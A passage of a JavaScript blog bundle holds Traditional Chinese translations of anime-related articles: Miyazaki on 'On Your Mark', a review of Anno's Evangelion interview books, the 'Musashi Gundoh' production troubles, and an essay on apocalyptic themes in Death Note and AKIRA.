年出生的我在電視上首次接觸到的鋼彈系列作品，但富野卻評道「我想要完全否定這部作品。結果會變成這樣，全部都是導演我的責任」。</p>\n<p>而這話在動畫業界中也很多人認為是「愛情的一體兩面」。就像當初對於「富野由悠季的世界展」的提案說了「別做這種白痴的企畫」，在靜岡縣立美術館開展首日還是帶著滿臉笑容前去視察。</p>\n<p>這次的訪談裡也是滿滿的這種「富野節」。從冠狀病毒對策到外交問題，動畫到模型業界，不論國內外接連發出對於政治家和業界關係人士的批評。</p>\n<p>對於口罩的「解釋」也十分獨特。我的解讀是，這是投出問題問道，即使擁有醫學方面的「知識」，或許仍然有著立於「不能隨波逐流於世界情勢」方針的視野才能看見的東西。</p>\n<p>人事物以及服務能夠超越國境移動的自由，雖然帶來了今日發展的繁榮，也成為了傳染症擴大的原因。雖然表露出對於孫子的愛情，在這個時間點依然果斷從人口爆發切入批判的富野的姿勢，也教導了我經濟成長所帶來的並不是只有幸福。</p>\n<p>當提出「給孩子們的訊息」，馬上得到「別瞧不起大人！」的叱責時，我不禁愣住了。但仔細聽則是「正是在這樣的狀況，更要多讀點書」的充滿愛情的訊息。</p>\n<p>在兩小時半的訪談最後，富野導演滿臉笑容地向我說道「你很纏人呢。很少有像你這樣的人。你是第一個。真的很討厭」。真是令人開心，這是身為記者的榮耀。</p>\n","date":"2020-11-10T22:31:39.000Z","excerpt":"","printDate":"November 10, 2020","printReadingTime":"1 min read"};

var route_8 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod21
});

var Mod22 = {"title":"【譯】宮崎駿與恰克飛鳥的短篇實驗劇場 吉卜力《On Your Mark》解析","slug":"ACG-on-your-mark","html":"<p>原文出自月刊《Animage》1995 年 9 月號的宮崎駿採訪。</p>\n<h2 id=\"介紹\">介紹</h2>\n<p>《On Your Mark》是吉卜利工作室以 CHAGE and ASKA 所發表的歌曲「On Your Mark」為基礎，所製作的宣傳影片動畫作品。於 1995 年 7 月 15 日在電影《海潮之聲》的上映內同時公開。</p>\n<p>本片原本計畫要在 CHAGE and ASKA 於 1995 年至 1996 年所舉辦的巡迴演唱會「SUPER BEST3 MISSION IMPOSSIBLE」裡，當成演出的一環在演唱會會場上映。</p>\n<p>而（會想到改成和作品同時上映的模式）是在製作 PV 時，ASKA 提出動畫作品的製作委託為契機，身為宮崎作品粉絲的 CHAGE 所提出的點子。</p>\n<p>根據監督所說，這部影片刻意扭曲了歌曲名稱和歌詞內容，以「活在終將到來的未來」為概念，製作成充滿惡意的內容。</p>\n<div style=\"position:relative;padding-bottom:56.25%;height:0;overflow:hidden;\"> <iframe style=\"width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden\" frameborder=\"0\" type=\"text/html\" title=\"on your mark\" src=\"https://www.dailymotion.com/embed/video/x33j0w3\" width=\"100%\" height=\"100%\" allowfullscreen > </iframe> </div>\n\n<h2 id=\"故事\">故事</h2>\n<p>舞台是地表被放射性元素所污染，疾病蔓延，人類開始轉居於地底下的，世紀末後的未來都市。</p>\n<p>武裝警察襲擊了某個邪教社團的設施「聖 NOVA&#39;S CHURCH」進行鎮壓。其中兩名警官在教團設施的深處，發現一名長有翅膀的少女。雖然兩人將她救出，她卻被政府機關當成研究資料帶到了設施去。於是展開為了能讓她回到天空上的奮鬥。</p>\n<h2 id=\"訪談\">訪談</h2>\n<h3 id=\"～我是刻意曲解了歌詞的內容製作這部影片的～\">～我是刻意曲解了歌詞的內容製作這部影片的～</h3>\n<p>AM：「警察」和「天使」什麼的，簡直就像是押井守老師的作品呢。</p>\n<p>宮崎：押井會過度專注於天使的誕生與無生之類的事情上，所以我就直接簡明地做呈現了 (笑)。雖說如此，我也沒有斷言她就是天使，或許她是個鳥人也不一定。其實那無所謂。</p>\n<p>AM：有種監督在 6 分 40 秒長的影片裡，塞進了一整部電影的內容的感覺呢。</p>\n<p>宮崎：我們加入了相當多符號性質的東西在裡頭。因為這是音樂影片，觀眾可以依照自己所看到所感受到的東西，自由去詮釋。</p>\n<p>AM：在片頭裡悠靜的田園景色裡聳立著的，那個奇異的建築物是什麼呢。</p>\n<p>宮崎：這要如何解釋都可以。我認為觀眾在看見四處出現，印有輻射注意標誌的卡車時，就會自然地理解（那個建築物會是什麼）了。地表上充滿了輻射，已經變成了人類無法居住的環境，但依然充滿著翠綠的植物，就像是車諾比週邊環境那般，化為大自然的聖地，而人類在地底下建立都市居住於其中。雖然我認為實際上人類大概不會採取這種居住方式，而是即使染病也會繼續居住在地表上。</p>\n<p>AM：這部動畫的定位是「On Your Mark」的音樂影片作品。</p>\n<p>宮崎：這首歌的歌名的意思是「各就定位」，我們刻意曲解了其中的內容去製作這支影片。這支影片就是所謂的世界滅亡之後的故事。充滿了核能輻射、彌漫著疾病的世界。我想著，實際上這樣的世界會不會真的降臨呢。</p>\n<p>想著活在那樣的世界裡會是怎麼一回事，製作了這支影片。那樣的時代肯定會變得極度混亂與失序，然而人們對於批評體制這類的事情卻會採取極度保守的態度吧。我想會有些事物因此喪失。直到失去一切、變成完全的無政府／無秩序的狀態時，人們會毫無價值地死去。這時只有「藥物」、「勞工運動」和「宗教」能舒緩這種狀況了對吧？ 這些事物將會開始蔓延。</p>\n<p>我將這首歌認定為，這是一首在這樣的時代裡，為了逃過審查體制，將想說的話寫成黑話的歌。是一部含有惡意的影片。(笑)</p>\n<p>AM：比如說這段歌詞「每當我們起跑後，總是被流行的感冒所擊倒」，裡面的「流行的感冒」所指的，就是充滿了核射能和疾病的世界嗎？</p>\n<p>宮崎：（不否定也不肯定地說）從地球整體的歷史看來，人類的問題就像是種流行的感冒。</p>\n<p>AM：…兩位警員所拯救的天使，看來就像是這在混沌的世界裡，唯一的一絲光芒呢。拯救天使的片段，也像是歌詞所唱的「即使如此我們也不會停手」，重複了好幾次。在幾度失敗之後，如同一絲救贖之光的她，自混沌的世界裡飛向藍天。但警員們則被遺留在了地上……。</p>\n<p>宮崎：因為她並不是救世主，警員也不會因為救助而和她有心靈上的交流。</p>\n<p>只是在這種狀況下，他們不選擇全面投降，有著自己的希望、以及這僅存且絕不願意假手他人的東西，到了不得不放手的時候，那就放到無人能夠觸及之處去。</p>\n<p>或許放手的瞬間，他們之間可能會有點心靈交流吧。而這樣就好，只要這樣就夠了。</p>\n<p>……他們也肯定會再次回歸警察的工作裡吧。雖然不曉得他們是否回得去 （笑）。</p>\n<p>AM：而回去的世界，依然是「流行的感冒」的世界。</p>\n<p>宮崎：到頭來，我們總是得從這裡出發。但即使是亂七八糟的時代，肯定也會有好事或令人興奮不已的事物。</p>\n<p>就像《風之谷》裡的那句台詞「我們是口吐著鮮血，不斷地不斷地翱翔，飛越早晨的鳥」。</p>\n<h2 id=\"歌詞\">歌詞</h2>\n<pre class=\"language-\"><code class=\"language-\">於是我們帶著 一往的笑容與姿勢 拍落遍在衣上的塵埃\n若是鬆開了手 落下的金幣 會一聲不響地 從此不再歸來\n想和你一同騎著腳踏車 追過這片晨曦\n\nOn Your Mark 當我們飛奔而出後 總被流行的感冒擊敗\nOn Your Mark 即使如此我們仍不停手\n因為望向夢想的斜坡 覺得能夠抵達前方\n\nOn Your Mark\n\n於是我們在內心的小小空地裡\n如同驟雨似地 互相揮灑著話語\n找不到答案 又覺得這就是答案\n如同想讀出 缺了時針的時鐘文字\n你和我都太過年輕 沒能認同這一切\n\nOn Your Mark 當我們飛奔而出後 總被流行的感冒擊敗\nOn Your Mark 我們消滅不了它\n為了呼喚我們 它已瞄準夢的心臟 On Your Mark\n\n於是我們\n\nOn Your Mark 當我們飛奔而出後 總被流行的感冒擊敗\nOn Your Mark 即使如此我們仍不停手\n因為望向夢想的斜坡 覺得能夠抵達前方\n\n於是我們\n\nOn Your Mark 當我們飛奔而出後 總被流行的感冒擊敗\nOn Your Mark 我們消滅不了它\n為了呼喚我們 它已瞄準夢的心臟 On Your Mark\n\n於是我們</code></pre><h2 id=\"參考文章\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://uttyr.blog90.fc2.com/blog-entry-3.html\">On Your Mark が描く原発事故後の「希望」</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.livedoor.jp/macgyer/archives/51369878.html\">続々々・岡田斗司夫の「寝言」 - 「ジブリがいっぱい」の「On Your Mark」</a></li>\n</ul>\n","date":"2019-01-19T06:30:08.000Z","excerpt":"","printDate":"January 19, 2019","printReadingTime":"1 min read"};

var route_50 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod22
});

var Mod23 = {"title":"【譯】我們當年的聖經在 Kindle 上復刻了 《新世紀福音戰士．分裂》、《新世紀福音戰士．偏執》","slug":"ACG-our-bible-just-reissue-in-kindle","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.excite.co.jp/news/article/E1416444712461/\">https://www.excite.co.jp/news/article/E1416444712461/</a></p>\n<hr>\n<p>庵野秀明的訪談集《新世紀福音戰士．分裂》和《新世紀福音戰士．偏執》終於在 AmazonKindle 上發售了。</p>\n<p>這兩本書是整理了 1996 年時於《Quick Japan》上所刊載的訪談內容，在 1997 年時出版的。正好是在《死與新生》（1997 年 3 月）、《Air/真心為你》（1997 年 7 月） 上映之前。</p>\n<p>當時出現了非常多的「《EVA》分析書」。解讀死海文書、朗基努斯之槍的意義、為什麼拿軍艦的名字來用、和村上龍作品的關係、與卡巴拉思想的連結…之類的。《分裂》與《偏執》對這些討論潑了桶冷水。</p>\n<blockquote>\n<p>庵野秀明：「他們只理解了字面上的意思。陷入了蒟蒻問答裡，過度解讀到我沒這樣想的東西，斷定必然就是如此。明明我不是這樣想的（笑）。作品開始自己越走越遠，我很討厭這種感覺」</p>\n</blockquote>\n<p>這兩本書對於當時的我們來說，是身為粉絲就理應要擁有的書。Film Book （譯註：直接把動畫的畫面裁剪編排成漫畫格式，並加上台詞和效果音的書籍）也是。理由有兩個。第一個是，書中超越動畫粉絲的框架，透過文化解析展開的討論脈絡。另一個是，這是本庵野秀明的解體書，也是讀者用以抑制自己的拘束用具。</p>\n<p>當時我以為只要看了這本書，或許就能理解《EVA》的謎題，而買下了它。但裡面有的卻是庵野說著「沒有這種東西」、「你們並沒有客觀地看待自己與社會」。讀完之後的我看完劇場版。只能「但我是如此痛苦」地依附在名為《EVA》的偶像上，更加地自我厭惡，直到現在。</p>\n<p>書的開頭從大泉實成聊起奧姆真理教開始。這是個社會瀰漫著不安與焦慮，虛構比現實更有刺激感的時代。書裡聊的是《EVA》完結後的事情。</p>\n<blockquote>\n<p>庵野秀明：「我曾經站在 GAINAX 的屋頂上，嘗試自己是不是真的會跳樓。試探自己只是覺得想死，還是真的想死。結果因為看來會很痛而害怕，因為物理上的痛楚而退縮了。之後便自己一個人龜縮起來哭泣入睡」</p>\n</blockquote>\n<p>《分裂》裡庵野表露出了自己最真實的一面。當時相當風行的宮崎駿作品對於庵野來說，是既尊敬卻也厭惡的存在。討厭《天空之城》。害怕高畑勲。討厭 90 年代日本整體的曖昧模糊感。因此創造出的心之壁，AT 領域。對粉絲在電腦連線上的感想感到失望。對人類的不感興趣。</p>\n<p>《偏執》裡眾人討論庵野秀明的人生、GAINAX 至今的軌跡，以及《新世紀福音戰士》。GAINAX 因為《奧特曼》與《大和號》而覺醒，制作 DAICON FILM，在《王立宇宙軍》（大名作！）遭遇商業上的失敗。然後，成了大紅牌。</p>\n<blockquote>\n<p>庵野秀明：「沒有什麼絕對會中的動畫。只有過去曾經中了的動畫。就像俗話說的，勝利只是偶然，敗北才是必然。」、「或許是因為我一無所有，才能無意識地反應出這個社會吧」</p>\n</blockquote>\n<p>除了訪談之外，還收錄有「庵野秀明 &quot;缺席審判&quot; 座談會」。參加者有新劇場版的監督鶴卷和哉、摩砂雪，角色設計貞本義行、宣傳部的佐藤裕紀、「星之子」部門（譯註：King Records 旗下負責聲優、動畫產品的部門）的製作人大月俊倫。能夠藉此瞭解周圍人眼中的庵野秀明。</p>\n<blockquote>\n<p>鶴卷：「庵野還曾經邊激憤地踢著置物櫃邊不斷怒罵呢。他只要一生起氣就無法處理了。完全沒人能阻止他」</p>\n<p>佐藤：「也沒人敢上去啊，當時他可是弄壞了置物櫃耶（笑）」</p>\n<p>摩砂雪：「不能去理他的」</p>\n</blockquote>\n<p>從那之後過了 20 年。新劇場版蔚為風潮，真嗣與他的夥伴們的笑容出現在便利商店的合作商品上。這是因為當時包含本書在內，所有雜誌都在討論《EVA》，時代開始接受動畫，才能作到這樣的事。連以前沒在看動畫的人突然開始看《EVA》這件事都開始令人懷念了。這本書是，對那些幾近瘋狂看待《EVA》的人們的叱責，使盡全力服務粉絲的，庵野秀明的憂鬱。</p>\n<blockquote>\n<p>庵野秀明：「看完那部作品得到的感想，就是那個人內心本質的部份。那個人所擁有最強烈的部份會顯現在對《EVA》的評價上。說著《EVA》空有外表的，就是在講著他自己是這樣的人」</p>\n</blockquote>\n<p>正是在有新劇場版的這個時代，才更推薦各位閱讀本書。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.amazon.co.jp/o/ASIN/B00NPWMDC8/ex-news-22/\">『スキゾ・エヴァンゲリオン』</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.amazon.co.jp/o/ASIN/B00NPWMDD2/ex-news-22/\">『パラノ・エヴァンゲリオン』</a></li>\n</ul>\n","date":"2020-07-04T19:52:26.000Z","excerpt":"","printDate":"July 4, 2020","printReadingTime":"1 min read"};

var route_14 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod23
});

var Mod24 = {"title":"【譯】動畫泡沫的代價 《MUSASHI GUN道》的悲劇 如何確保製作團隊人員的難題","slug":"ACG-paintaking-of-anime-buble-tragedy-of-musashi-gundoh","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://ameblo.jp/ambt5334/entry-12229276743.html\">https://ameblo.jp/ambt5334/entry-12229276743.html</a></p>\n<hr>\n<p>※本頁面的內容是從原本記載於「日本動畫歷史年表之 4 2001 年（平成 13 年）～ 2010 年（平成 22 年）」裡電視動畫《MUSASHI GUN 道》的相關內容搬移過來的。</p>\n<p>2006 年，被稱為動畫泡沫的這年裡所制作的動畫數量，是在統計歷史上次於 2015 年、2014 年後第三多的一年。</p>\n<p>雖然這在統計上看起來是動畫產業的興盛，然而實際狀況是，因為作品數量增加，如何確保製作人員和在期限內交貨的風險也因此提高。</p>\n<p>因此有必要盡可能提早確保優秀的人員，導致各地的工作室出現大風吹搶椅子遊戲，並不是所有人都能夠確保人材。</p>\n<p>《MUSASHI GUN 道》所深陷的，可說就是這樣的不幸。</p>\n<p>在製作主管製作人菅谷信行的訪談記事裡，有提到本作品因為沒辦法和電視台達成播放、串流行程的共識，直到準備播放的 1 個月前都還沒決定是不是要播放。直到終於敲定播放後，這段紛爭卻導致第 1 話的制作時間只剩下 2 個禮拜的極度嚴苛事態。在製作準備期間已經很短的情況下，也找不到國內的製作人員，只能把原畫和動畫交給中國、韓國的二次承包公司，卻不幸地遇到過去擔任迪士尼作品二次承包的製作人員年事已高，以及新的國家政策使得動畫學校畢業後的年輕動畫師直接參與制作，想提出對方的技術不足也十分困難。也就是海外的製作人員也無法如預期地確保。</p>\n<p>因為沒有時間，也有許多海外製作人員不熟稔日本文化與風俗，使得不充份的開會和意思傳達、缺乏技術力，導致大量粗糙的上色稿，即使想讓日本的工作室進行最後的修正，<strong>極度殘酷的制作狀況卻是直到 V 編當天才會拿到上色稿</strong>。在以動畫制作為舞台的動畫作品《SHIROBAKO》裡有句台詞「已經萬策休矣了 — ！」廣為人知，在現實世界裡《GUN 道》則是已經慘到了木下導演講出「我已經做不下去了」。</p>\n<p>《MUSASHI-GUN 道-》是原作者 Monkey Punch（加藤一彥，魯邦三世的原作者）構思了 12 年的作品，因此許多粉絲是抱著期待觀看的，卻對其作畫品質之低劣感到愕然。</p>\n<p>有太多有趣的畫面，而在沒有演出的畫面裡武藏突然講出「唔哇！好刺眼！」的一幕也廣為動畫迷所知。</p>\n<p>包含這部作品在內，同時期播放的一部份作品的作畫品質問題，被認為是因為作品制作的數量超過了制作負荷，也就是「粗制濫造」所導致的。而這或許能代表至今為止的動畫業界構造問題，成為之後讓粉絲與業界一同議論改善方式的誘爆劑。</p>\n<p>現在中國和韓國的年輕動畫師因為技術成長，獲得了比當時更多的動畫製作協助委託，但發出作品委託的製作方和接受的制作方的能力與負荷問題、製作費用和動畫師的薪水配額問題，至今仍有許多課題需要解決。</p>\n<p>增加製作的委託量，卻不願意提高制作成本，即使提高海外的委託量，也無法解決國內的動畫制作問題。反而只是使得國內制作人員更為減少。</p>\n<p>而必須要在這狹縫中，等到製作的高層們不斷動搖的判斷終於決定後，由在各種限制底下扛起責任的導演做到最後完成的作品，是否能和導演個人的手腕（才能）直接畫上關聯，其實反而是更和運氣的好壞有關，我認為站在動畫粉絲的立場，更要慎重地不去做出這種會顯得粗暴的判斷。</p>\n<p>※木下ゆうき導演是位至今經手過許多知名作品的作畫監督、原畫的老手動畫師</p>\n<h2 id=\"相關資料\">相關資料</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.saegusa-pat.co.jp/copyrighthanrei/1948/\">■ ＲＧＢアドベンチャー事件（最判平成 15 年 4 月 11 日）</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.goo.ne.jp/hballoon/e/d1270715d7e03af6c6a51ec60e35a0d3\">■「RGB アドベンチャー」打ち切り</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://middle-edge.jp/articles/h0emD\">■ アニメの作画崩壊事件：ヤシガニ・キャベツ・ガンドレス・MUSASHI-GUN 道・かんたんルミナス他</a></li>\n</ul>\n","date":"2020-05-10T19:34:45.000Z","excerpt":"","printDate":"May 10, 2020","printReadingTime":"1 min read"};

var route_4 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod24
});

var Mod25 = {"title":"【譯】PAS 動畫評論 次文化與末世論","slug":"ACG-Pause-And-Select-Apocalypse","html":"<h2 id=\"part1death-note\">part1[DEATH NOTE]</h2>\n<ul>\n<li>影片來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=kvvUiXc6m7U\">https://www.youtube.com/watch?v=kvvUiXc6m7U</a></li>\n<li>日文翻譯：<a target=\"_blank\" rel=\"nofollow\" href=\"https://nico.ms/sm33744630\">https://nico.ms/sm33744630</a></li>\n</ul>\n<p>嘿，這真是有趣。我們來聊聊小畑健和大場つぐみ這對搭檔創造的名作，《死亡筆記本》動畫版所省略的，原作漫畫的第 108 話吧。在這話裡世界的復原與奇樂留下的影響形成對比，犯罪和墮落再次興起，世界恢復至原有的秩序，畫面之後帶到奇樂信徒們悲傷行進的隊列，進行祈願奇樂復活的儀式，若要我們直接先給出這段內容的主題，其重點在於「不變的世界」。</p>\n<p>《死亡筆記本》的故事講述的是，擁有殺人筆記本的主角夜神月，如何透過筆記本達成殺人技倆等等，內容相當有趣，但在這次影片裡我們不會提及；試圖把持死亡筆記本成為新世界的神的夜神月，以及自稱為「L」 的名偵探出現，之後進到奇樂和 L 的鬥智過程故事。</p>\n<p>漫畫和動畫在結局上的差異有個有趣的點，裡頭其實有個共通的普世概念， 「終末信仰／啟示文學（APOCALYPTICISM）」，透過混合各式各樣的末世概念，《死亡筆記本》絕妙地刻畫出日本社會的病理。這麼一說也許會有人覺得怪異，講到啟示錄，人們聯想到的會是更偏向物理層面上的破壞，以動畫的知名例子來說就是《AKIRA》裡的新東京廢墟，《AKIRA》裡的「啟示錄」是表現於物理層面上的。而在《死亡筆記本》裡，尤其在故事初期，社會秩序是正常運作著的，即使在政治層面上服從於奇樂，也沒有導致秩序崩壞，月也還是會去學校，有著朋友和工作，因此這裡所說的「啟示錄」指的並不是破壞，而是更接近於這個詞彙語源的用法。</p>\n<blockquote>\n<p>默示錄信仰（apocalypse） 的原意是來自於 「掀開紗帽（vail）」 的希臘語 「apokalypsis」 ，意思是揭示新的事實或是拆穿秘密。</p>\n</blockquote>\n<p>根據田中素子所說，啟示（apocalypse） 的原義是揭露秘密的事實，死神的降臨、米砂的登場與魅上的指名也可以說是這種意涵的啟示／開示，但是在 2 世紀的猶太教圈裡，這個詞彙的意義開始有所變化，在開示之上再添加了「善與惡的最終戰爭」或是「受迫民族的寓言」的意義。但重點就在於這股意義上的「雙重性」，秘密儀式的開示／被壓抑之人的救濟，</p>\n<p>夜神月曾說過，他要成為新世界的神，並且要成為受凌虐之人的代辯者，這段話裡的雙重性…不論這是不是他的真心話，月的理論令人想到啟示的雙重性，在向琉克談論他的理想時，光線自後方射入的場景，可說是非常基督教的，隨著月醜陋的一面顯露出來，夜神月宗教般的正義感，和西洋啟示錄裡所看到的二分法、猶太教與基督教的善惡觀是同樣的東西，在視覺的表現上也能看到這樣的表現，比如說片頭裡致敬了米開朗基羅的「創造亞當」，南空緒美致敬了米開朗基羅的「哀悼基督」，夜神月所說出的第一句話是「汝等應遵從神的教誨，如此便能獲得海的恩惠，免於遭到風雨的襲擊。」，死亡的制裁／最終審判這個概念本身也是來自於啟示錄內的想法，</p>\n<p>但若是在這裡就停住，是無法連接回開頭提的，故事的有趣之處，因為其實裡頭還有著不屬於基督教的一面，關於這點我參考了《神罰的必然性:在死亡筆記本裡的啟示錄宗教性》這份論文（<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tandfonline.com/doi/abs/10.1080/15348423.2012.706158\">Evil Must Be Punished: Apocalyptic Religion in the Television Series Death Note</a>），裡頭提到《死亡筆記本》裡，關於啟示錄的象徵並沒有發揮功能，的確《死亡筆記本》基本上是月獲得成功的故事，裡頭沒有神罰的救贖效果，他對於大場／小畑從宗教性中抽手的解讀是正確的，虛構故事終歸虛構故事，讀者看來也是如此。</p>\n<blockquote>\n<p>由於這是刊載在少年雜誌的作品，我們很自然地在思想的部份上踩了煞車，\n並且僅以純粹性的娛樂為目標。</p>\n</blockquote>\n<p>而 Frohlich 為了填補這份空白，做出了「神罰的缺席，就等同於肯定了月的思想」的結論，但因為前述的那段重要的章節，在此我難以同意這點，末世思想有著地域性上的差異，田中素子提到其在西洋和東洋的差別，尤其是在時間觀念上的差別，西洋的末世觀裡並不存在「末世的先頭」，乃是以直線性的時間觀念為基礎，而描寫了社會回歸的死亡筆記本，在這股意義上並不是偏西洋的，這裡頭有著 Frohlich 所漏掉的，日本的末世觀，「輪迴轉生（CYCLICALITY）」。</p>\n<p>這種思想認為，森羅萬象終會循環回歸原形。月所說的「新世界」並不是走向最後審判的千年王國，而是混合的世界。這種構造可以從畫和故事的差異裡看出，本作在畫面上使用了猶太•基督教的象徵，但故事的結尾和構造是佛教的輪迴思想，雖然只有在後記的故事裡表現出了輪迴思想，但在談論末世論時，即使只是「結尾」也帶有著重要的意義，這個後記是不帶有時間性的寓言，月的死相和最後的獨白，也令人聯想到奇樂的出現輪迴、不斷重複的寓言，猶太•基督教的主題和有歧異的混合性結局。那麼為什麼這份混合性是重要的呢，這種融合兩種對極的結局，在理解日本的末世論時是很重要的，因此我們除了《死亡筆記本》之外，還有必要向文學和歷史踏足，《死亡筆記本》並不是唯一的例子，它以特例研究來說是很有趣的，但在考察複雜的日本的終末、災害時，它僅是個出發點，為了加深考察，並且解開在日本現代虛構作品裡的終末思想的環節，讓我們稍微回到過去吧，回到 1945 年。（接續至 part2）</p>\n<h2 id=\"part2akira\">Part2[AKIRA]</h2>\n<ul>\n<li>影片來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=L5XeDQ6sb2g\">https://www.youtube.com/watch?v=L5XeDQ6sb2g</a></li>\n<li>日文翻譯：<a target=\"_blank\" rel=\"nofollow\" href=\"https://nico.ms/sm33748001\">https://nico.ms/sm33748001</a></li>\n</ul>\n<p>為了更加瞭解這些訊息，以及為何這種啟示錄性質的思想，會出現在像《死亡筆記本》這類流行的作品裡，並且獲得成功，讓我們稍微回到過去吧，回到 1945 年。</p>\n<p>抱歉，上次我可能說的不是很清楚，日本的終末類作品並不是從 1945 年開始的，末世思想的 SF 作品輸入，能夠追溯到明治時代初期，當時的民間故事和佛教的世界觀裡都帶有著終末性的內容，比明治更古老的末法思想，和現代的終末系作品也有著深厚的連結，但這種傳統的末世觀在第二次世界大戰裡迎來了巨大的變動，猶太人大屠殺和東京大空襲的大規模殺戮，以及範式（Paradig，認識論中指的大眾思考方式）上的切斷，加上大敘事的崩壞、「特異的經歷」 ——一段即使在現代動畫裡仍重複地出現，至今依舊無人不曉的…</p>\n<p>這是《哥吉拉》的時代，是核災受害者文學的時代，但核爆不過是日本災害這巨大的文脈裡的一例，以日本的終末虛構故事而言，最大的重點是「不連續性」 ——從帝國變為敗戰國的大轉變，從君主制走向民主制，從國家的勝利走向完全的敗北，</p>\n<p>根據社會學者的大澤真幸所說的，戰後在物質和精神上的復興可分為 2 種範式，首先是「理想的時代」，之後是「虛構的時代」。</p>\n<p>「理想的時代」是以戰後的理想和革命的大敘事為前提的時代，60 年代是進行思想體系政治運動的時代，是試圖讓現存秩序更加完美的運動家們的時代，但動畫和漫畫對於這個時代的印象是薄弱的，例如首部國產電視動畫《阿童木》就不帶有這種氛圍；同時期相關著作則有安部公房的《第四間冰期》和松林宗惠的《世界大戰爭》，動畫、漫畫和這樣的社會保持著距離，</p>\n<p>「理想的時代」可視為在 70 年代的前半告終，大澤真幸認為連合赤軍的「淺間山莊事件」是其終焉，佐佐淳行也認為淺間山莊事件顯示出了日本的新左翼運動的衰退；隨著理想主義的時代結束，社會迎來了新的思想範式，這是人們不再試圖改善既存的系統，轉向幻想新世界的時代，這是「虛構的時代」，不再追求理想，而是追求幻想的時代，人們的志向和共同意識自思想體系離開，走向「不存在於這裡的某處」的孤離，這時末世類作品興極一時，這是《日本沉沒》的時代，這是《風之谷》的時代，這是《宇宙戰艦大和號》的時代，以及大友克洋帶有極高度影響力的漫畫／動畫…</p>\n<p>《AKIRA》的時代。</p>\n<blockquote>\n<p>（《AKIRA》的）追趕場景，結束在「舊市街（東京）」的巨大坑洞。\n也許坑洞是作為一種提醒，述說著歷史並不是能夠輕易地捨棄的。</p>\n<p>Susan Napier, Panic Sites</p>\n</blockquote>\n<p>《AKIRA》 的漫畫和動畫皆自「創造新世界」開始和結束，不過這樣講有些太急促了，兩者在大綱上是同樣的 ——「炸彈」直擊了東京，引發第三次世界大戰，以及促成反烏托邦城市新東京的建設，暴走族少年金田和鐵雄在抗爭時遇見超能力少年高志（タカシ），災害滾雪球般地不斷累積，鐵雄獲得超能力並且成長，另一方面金田遇見了反政府游擊軍的女性惠（ケイ），在新東京接二連三面對各種問題時， 「爆發」的起因阿基拉（アキラ） 覺醒了。</p>\n<p>重點在於故事的這股支離破滅感，因為這和主題的「後現代主義性」有所連接，Fredric Jameson 的後現代主義用語裡有「pastiche」和「schizophrenia」這兩個詞，「pastiche（模仿）」指的是對其他文脈的引用，但其重點在於「引用會替換文脈，並且消去其現實和虛構的境界線」，例如稍早提的《哥吉拉》和核彈也是一例，但不只是如此，還有《日本沉沒》裡的海嘯、世界大戰的軍事概念、來自《鐵人 28》與《童夢》的自我引用。另一方面「schizophrenia（分裂症）」指的是敘事的斷絕，根據 Jameson 所說，在後現代主義的解釋下，它指的是輕視連續性，各個場景僅是散落的碎片。</p>\n<p>《AKIRA》也是個在角色之間不斷地交替，談論著複雜怪異事變的故事，作品並不在乎其之間的連續性，甚至存在著不是為了做出某種效果，純然斷絕、毫無必然性的場面切換。</p>\n<p>那麼為什麼這種後現代性在日本的末世觀裡是重要的呢，Freda Freiberg 將著眼點放在，《AKIRA》的觀眾世代並沒有經歷過廣島和長崎的體驗，若要說現代日本的末世論是從核爆開始的，《AKIRA》的觀眾是和這有著斷絕的世代，他們是和金田與鐵雄一樣，對於大慘劇（catastrophe）的原爆點不帶有實感的世代，因此在這層意義上，我認為可以說理解《AKIRA》就等於理解了現代的日本人，以及這兩者共通的「不連續性」。《AKIRA》的漫畫和動畫都同樣過量引用了末世的記號，將戰後日本的不確定性鎖在裡頭，這是部透過錯綜而斷片的敘述，將歷史總括於其中的作品。</p>\n<p>《AKIRA》的內容主題不勝枚舉，反政府游擊軍讓人想起連合赤軍、動畫的宮子（ミヤコ）讓人想起 20 世紀末的新興邪教、沉積於水邊的王位是高牆環繞的皇居，或是四面環海的日本的象徵，而在王座上的阿基拉（アキラ）當然就是昭和天皇，街角的描寫也讓人想到 50－60 年代的政治運動，實驗體（Numbers）和軍隊的結合讓人想到戰後的成長與核能之間的關係，以及日本首次體驗到的「炸彈」，阿基拉（アキラ）被埋在看似是國立競技場的地方，也和核爆的記憶封印重疊。</p>\n<p>Christopher Bolton 說道：「阿基拉（アキラ）是在戰後成長時，被埋藏起來的黑暗歷史的記憶」，換句話說，阿基拉（アキラ）是在復興和破壞兩方上都有所貢獻的，強大能源的象徵，但是在漫畫版裡阿基拉（アキラ）只是個單純的崇拜對象，實際引發事件的是鐵雄，若說阿基拉（アキラ）是象徵過去的日本，鐵雄就是未來，也就是象徵新世代的日本人，</p>\n<p>在解讀《AKIRA》上相當知名的 Susan Napier 的論文『Panic Sites』裡，介紹了「新人類」這個詞彙，用以指稱成長於 70 年代後半豐饒和平的日本，對戰爭一無所知的年輕人們，雖然鐵雄並不能算是典型的新人類，Susan 將著眼點放在其無法控制力量的不安與無能力性上，鐵雄的異形化是新人類世代的力量的象徵。Napier 認為不斷和無機物融合的鐵雄的身姿，是持有過多力量的哀傷思春期的表現，不斷和機械融合而異形化的鐵雄，正是隨著急速劇烈的成長而顯得像是分裂症的日本人的身姿，</p>\n<p>漫畫和動畫共通的特徵「父親的缺席」也是其佐證，Freiberg 